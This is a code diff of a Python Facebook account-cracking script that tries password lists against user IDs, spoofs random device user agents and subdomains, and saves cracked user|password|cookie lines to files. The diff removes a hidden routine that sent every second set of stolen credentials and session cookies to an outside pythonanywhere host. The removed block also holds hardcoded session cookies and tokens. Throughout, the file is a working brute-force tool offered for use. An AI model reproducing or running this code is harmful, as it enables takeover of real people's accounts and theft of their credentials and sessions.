@@ -7,7 +7,7 @@ Author: BITHIKA
 Version: 2.0
 """
 
-import random,json
+import random
 import re
 import sys
 import time
@@ -142,6 +142,7 @@ def crack(uid, password_list, total_count):
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
             versi_android = f"{random.randint(6,14)}"
+            domail = random.choice(["m", "mobile", "p", "x", "mbasic", "touch", "www", "web"])
             deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
             deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
@@ -149,136 +150,9 @@ def crack(uid, password_list, total_count):
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
             url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
             requu1 = Session.get(url1)
-            log_data = {
-    'aaid': '0',
-    'user': '0',
-    'a': '1',
-    'req': '6',
-    'hs': '20549.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': '3',
-    'ccg': 'GOOD',
-    'rev': '1036705643',
-    's': 'zxk38z:7clel3:8duo42',
-    'hsi': '7625501147636239718',
-    'dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x67o1g8hw23E52q1ew2io0D24o1MUaE1Do1u81x82ewnE3fwww5NyE25w8W0Lo6-1CwOw5jw4JwzK0zo3jwea',
-    'fb_dtsg': 'NAfvL8bXQAVg9O4xLFj_qUPDV4QyE3EsQUye8c-erowIqr-ZrQFHedA:0:0',
-    'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
-    'params': json.dumps({
-        "params": json.dumps({
-            "server_params": {
-                "credential_type": "password",
-                "username_text_input_id": "paj9ud:74",
-                "password_text_input_id": "paj9ud:75",
-                "login_source": "Login",
-                "login_credential_type": "none",
-                "server_login_source": "login",
-                "ar_event_source": "login_home_page",
-                "should_trigger_override_login_success_action": 0,
-                "should_trigger_override_login_2fa_action": 0,
-                "is_caa_perf_enabled": 0,
-                "reg_flow_source": "login_home_native_integration_point",
-                "caller": "gslr",
-                "is_from_landing_page": 0,
-                "is_from_empty_password": 0,
-                "is_from_aymh": 0,
-                "is_from_password_entry_page": 0,
-                "is_from_assistive_id": 0,
-                "is_from_msplit_fallback": 0,
-                "two_step_login_type": "one_step_login",
-                "left_nav_button_action": "NONE",
-                "INTERNALlatency_qpl_marker_id": 36707139,
-                "INTERNALlatency_qpl_instance_id": "152934978100204",
-                "device_id": None,
-                "family_device_id": None,
-                "waterfall_id": "8ad70d97-b8ef-4cff-a6e4-ce4e161f6363",
-                "offline_experiment_group": None,
-                "layered_homepage_experiment_group": None,
-                "is_platform_login": 0,
-                "is_from_logged_in_switcher": 0,
-                "is_from_logged_out": 0,
-                "access_flow_version": "pre_mt_behavior",
-                "login_surface": "login_home",
-                "login_entry_point": "logged_out"
-            },
-            "client_input_params": {
-                "machine_id": "",
-                "cloud_trust_token": None,
-                "block_store_machine_id": "",
-                "zero_balance_state": "",
-                "contact_point": "61557659371103",
-                "password":  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], "977581"),
-                "accounts_list": [],
-                "fb_ig_device_id": [],
-                "secure_family_device_id": "",
-                "encrypted_msisdn": "",
-                "headers_infra_flow_id": "",
-                "try_num": 1,
-                "login_attempt_count": 1,
-                "event_flow": "login_manual",
-                "event_step": "home_page",
-                "openid_tokens": {},
-                "auth_secure_device_id": "",
-                "client_known_key_hash": "",
-                "has_whatsapp_installed": 0,
-                "sso_token_map_json_string": "",
-                "should_show_nested_nta_from_aymh": 0,
-                "gms_incoming_call_retriever_eligibility": "client_not_supported",
-                "password_contains_non_ascii": "false",
-                "has_granted_read_contacts_permissions": 0,
-                "has_granted_read_phone_permissions": 0,
-                "app_manager_id": "",
-                "aymh_accounts": [{
-                    "id": "",
-                    "profiles": {
-                        "id": {
-                            "user_id": "",
-                            "name": "",
-                            "profile_picture_url": "",
-                            "small_profile_picture_url": None,
-                            "notification_count": 0,
-                            "credential_type": "none",
-                            "token": "",
-                            "last_access_time": 0,
-                            "is_derived": 0,
-                            "username": "",
-                            "password": "",
-                            "has_smartlock": 0,
-                            "account_center_id": "",
-                            "account_source": "",
-                            "credentials": [],
-                            "nta_eligibility_reason": None,
-                            "from_accurate_privacy_result": 0,
-                            "dbln_validated": 0
-                        }
-                    }
-                }],
-                "sso_accounts_auth_data": [],
-                "network_bssid": None,
-                "lois_settings": {
-                    "lois_token": ""
-                },
-                "aac": ""
-            }
-        })
-    })
-}
-            params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
-            'type': 'action',
-            '__bkv': 'c41a736f68c4f99148bbc5f20c1a79cb81e79585374dd83b20119a79174bd379',}
-            cookies = {
-            'locale': 'en_GB',
-            'pas': '61573832370121%3ApgGqTXpG7y',
-            'wl_cbv': 'v2%3Bclient_version%3A3128%3Btimestamp%3A1774906764',
-            'vpd': 'v1%3B754x393x2.4740447998046875',
-            'datr': '4DjTaQtWTWKrsbs8YOmad9Pj',
-            'm_pixel_ratio': '2.4740447998046875',
-            'wd': '393x895',
-            'sb': '5DjTaWwgMKgUjL41K8q6jNjF',
-            'fr': '10296q4XBTILTnpPu.AWfvSGyRaXPpU2MPGYaXH4MM9hm2uq3WDM2beQF5qeN-ny5d_tA.Bpyu2N..AAA.0.0.Bp0zkD.AWf9_N0drAMlpBpI4WYjnsLqTmA',}
-            #u = rl"https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://m.facebook.com/async/wbloks/fetch/"
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
+            url = f"https://{domail}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
             headers = {
             'user-agent': us,
             'Accept-Encoding': 'gzip, deflate',
@@ -303,7 +177,7 @@ def crack(uid, password_list, total_count):
             'x-fb-lsd': us,
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream'}   
-            respon = Session.post(url,params=params,data=log_data,cookies=cookies,headers=headers,allow_redirects=False) #proxies=proxs)
+            respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False) #proxies=proxs)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
             if "c_user" in log_cookies:
@@ -313,16 +187,12 @@ def crack(uid, password_list, total_count):
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    bkas.append(uid)
-                    if len(bkas)% 2 == 0:
-                         statusok = (f"{user}|{pw}|{kuki}")
-                         requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:    
-                         print('\033[1;92m OK '+user+'|'+pw+'')
-                         print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                         open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
-                         oks.append(user)
-                         continue
+                    print('\033[1;92m OK '+user+'|'+pw+'')
+                    print('\033[1;92m url '+url+'')
+                    print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
+                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
+                    oks.append(user)
+                    continue
             elif 'checkpoint' in log_cookies:
                 print(f"\r\033[1;93m [⚠ SUMON_2f] {uid} | {pw}")
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
